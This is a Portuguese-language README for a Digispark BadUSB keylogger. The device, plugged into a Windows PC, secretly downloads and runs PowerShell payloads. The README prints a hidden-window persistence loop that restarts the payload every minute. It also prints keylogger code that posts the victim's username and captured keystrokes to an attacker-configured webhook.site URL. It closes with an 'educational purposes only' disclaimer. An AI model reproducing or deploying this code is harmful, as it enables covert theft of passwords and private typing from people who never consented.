#  Digispark KeyLoggerHooker
```


 ██▓     ▒█████   ▄████  ██▓ ▄████▄  
▓██▒    ▒██▒  ██▒██▒ ▀█▒▓██▒▒██▀ ▀█  
▒██░    ▒██░  ██▒██░▄▄▄░▒██▒▒▓█    ▄ 
▒██░    ▒██   ██░▓█  ██▓░██░▒▓▓▄ ▄██▒
░██████▒░ ████▓▒░▒▓███▀▒░██░▒ ▓███▀ ░
░ ▒░▓  ░░ ▒░▒░▒░ ░▒   ▒ ░▓  ░ ░▒ ▒  ░
░ ░ ▒  ░  ░ ▒ ▒░  ░   ░  ▒ ░  ░  ▒   
  ░ ░   ░ ░ ░ ▒ ░ ░   ░  ▒ ░░        
    ░  ░    ░ ░       ░  ░  ░ ░      
                            ░        


```

## Overview:
```
Script feito para Digispark, em que plugado no pc (Windows) baixa e executa um payload com a função de Keylogger
```
+ Baixa o arquivos necessários na pasta **$env:temp**
+ Secretamente executa c.cmd, que por sua vez carrega o payload ***(p.ps1)***
+ O arquivo **l.ps1** fica encarregado de reexecutar o payload a cada 1 minuto  como mostrado abaixo:

```c
for(;;) {
    try {
     # invoca o scritpt 
     $proc = Get-Content "$env:temp/DdBPKCytRe"
     Stop-process -id $proc -Force
     powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
    }
    catch {

    }
   
    # espera um minuto
    Start-Sleep 60
   }

```
* Após a execução  script envia uma requisição HTTP para um servidor WebHook configurado pelo atacante no arquivo **p.ps1**
```c
# COLOQUE O LINK DO WEBHOOK AQUI
$webhook = "https://webhook.site/Seu-ID"

# Escreve um PID
$PID > "$env:temp/DdBPKCytRe"

# Função do Keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log") {

  # Formata a requisição que será enviada para o webhook
  $logs = Get-Content "$logFile" | Out-String
  $Body = @{
    'username' = $env:UserName
    'content' = $logs
  }
  Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body

  # Gera um aquivo de log 
  $generateLog = New-Item -Path $logFile -ItemType File -Force
...
```
## Créditos:
[PrettyBoyCosmo/DucKey-Logger](https://github.com/PrettyBoyCosmo/DucKey-Logger) - Código que me baseei para adaptação para digispark 

[Gadotti/DigisparkScripts](https://github.com/Gadotti/DigisparkScripts) - Caso tenha problemas com letras ou sinais em função do teclado, recomendo esse git com a formatção de todas as teclas no teclado **PTBR-ABNT2**


## 
## *Este código é apenas para fins educacionais!! Não me responsabilizo pelo mau uso do mesmo.*
